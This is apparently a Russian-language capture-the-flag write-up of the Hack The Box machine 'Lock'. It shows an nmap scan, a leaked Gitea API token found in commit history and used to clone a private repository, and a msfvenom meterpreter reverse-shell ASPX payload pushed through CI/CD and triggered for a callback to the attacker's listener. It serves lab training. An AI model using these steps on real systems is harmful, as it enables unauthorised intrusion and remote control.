Сначало я проверяю сканером наличие открытых портов.

```bash
nmap -sV -sC -Pn 10.129.22.109
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-18 10:53 CDT
Nmap scan report for lock.htb (10.129.22.109)
Host is up (0.080s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/plain;charset=utf-8
|     Set-Cookie: i_like_gitea=404f4d4bead09062; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=_EkqAB9k88owAGplTP8Ek8Z9vws6MTc2MDgwMjg3NTE2MzU0NDUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 18 Oct 2025 15:54:35 GMT
|     Content-Length: 11
|     found.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=15fc8da2b2428f5c; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=lq6QnE_V6EAYwWgBORyN4pCbozI6MTc2MDgwMjg0ODc2NjE3NTEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 18 Oct 2025 15:54:08 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-10-17T15:51:43
|_Not valid after:  2026-04-18T15:51:43
|_ssl-date: 2025-10-18T15:56:07+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-18T15:55:28+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=10/18%Time=68F3B814%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Method\x
SF:20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control:\x
SF:20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-Coo
SF:kie:\x20i_like_gitea=15fc8da2b2428f5c;\x20Path=/;\x20HttpOnly;\x20SameS
SF:ite=Lax\r\nSet-Cookie:\x20_csrf=lq6QnE_V6EAYwWgBORyN4pCbozI6MTc2MDgwMjg
SF:0ODc2NjE3NTEwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=
SF:Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2018\x20Oct\x20
SF:2025\x2015:54:08\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(FourOhFourRequest,1CA,"HTTP/1\.0\x20404\x20Not\x20Found\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Content-Type:\x20text/plain;charset=utf-8\r\nSet-Cookie:\x20i_like_gite
SF:a=404f4d4bead09062;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20_csrf=_EkqAB9k88owAGplTP8Ek8Z9vws6MTc2MDgwMjg3NTE2MzU0NDUwMA;\x2
SF:0Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sa
SF:t,\x2018\x20Oct\x202025\x2015:54:35\x20GMT\r\nContent-Length:\x2011\r\n
SF:\r\nNot\x20found\.\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-18T15:55:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.45 seconds
```

Решаю посмотерть, что находится на портах и вижу, что на 3000 порту есть что то вроде гит репозитория:

![git-repo](image.png)

Вижу открытый репозиторий, где лежит dev-script. Вижу, что скрипт делает запрос по API, вижу, что используется токен, если я получу токен, то смогу тоже сделать запрос и посмотреть, что он мне даст.

Я решаю посмотреть историю, вижу что было два комита и в первом есть слитый токен, если его еще и не отозвали, то может получится.

```bash
curl 'http://lock.htb:3000/api/v1/user/repos' -H Authorization:'Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f' > server.json
```

В Ответе я вижу, что есть еще один репозиторий - website. И мея токен я могу его склонировать.

```bash
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@lock.htb:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.77 MiB/s, done.
Resolving deltas: 100% (35/35), done.
```

Смотрю чендлог, ничего интересного:

```bash
cat changelog.txt 
# Changelog

- Added first website version
```

А вот README указывает, что CI/CD автоматически деплоит все что заливается в репозиторий.

```bash
cat readme.md 
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

Пробуем сделать комит с реверс шелом и посмотрет сработает ли. Так как у нас вебсервер Microsoft IIS, то потребуется нестандартный пейлоад, проще всего использовать msfvenom для его генерации.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.167 LPORT=4444 -f aspx > rev.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of aspx file: 3660 bytes
```

Далее я использую msfconsol для запуска лушателя:

```bash
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.167
LHOST => 10.10.14.167
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
LPORT => 4444
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
```

После чего ранее сгенерериваны ревесл шел, я пушу в репозиторий и тригерю его curl:

```bash
curl http://lock.htb/rev.aspx

в консоли mrtrrpreter полуяаем шелл

(Meterpreter 1)(c:\windows\system32\inetsrv) > sysinfo
Computer        : LOCK
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 4
Meterpreter     : x64/windows
```


